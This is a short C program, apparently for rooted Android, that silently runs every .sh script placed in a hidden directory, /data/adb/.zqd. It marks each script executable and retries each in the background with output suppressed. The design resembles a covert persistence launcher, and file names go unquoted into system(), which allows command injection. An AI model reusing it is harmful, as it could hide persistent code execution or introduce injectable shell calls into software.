#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>

void execute_with_retry(const char *path) {
    char cmd[512];
    int ret, tries = 0;
    snprintf(cmd, sizeof(cmd), "sh %s > /dev/null 2>&1 &", path);

    while (tries < 60) {
        ret = system(cmd);
        if (ret == 0) return;
        tries++;
        sleep(1);
    }
}

int main() {
    const char *dir_path = "/data/adb/.zqd";
    DIR *dir;
    struct dirent *entry;
    char full_path[512];
    struct stat st;

    dir = opendir(dir_path);
    if (dir == NULL) {
        mkdir(dir_path, 0755);
        return 0;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        char *dot = strrchr(entry->d_name, '.');
        if (dot == NULL || strcmp(dot, ".sh") != 0) continue;

        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);
        if (stat(full_path, &st) != 0) continue;
        if (!S_ISREG(st.st_mode)) continue;
        if (st.st_size == 0) continue;

        if (access(full_path, X_OK) != 0) {
            chmod(full_path, st.st_mode | S_IXUSR | S_IXGRP | S_IXOTH);
        }

        execute_with_retry(full_path);
    }

    closedir(dir);
    return 0;
}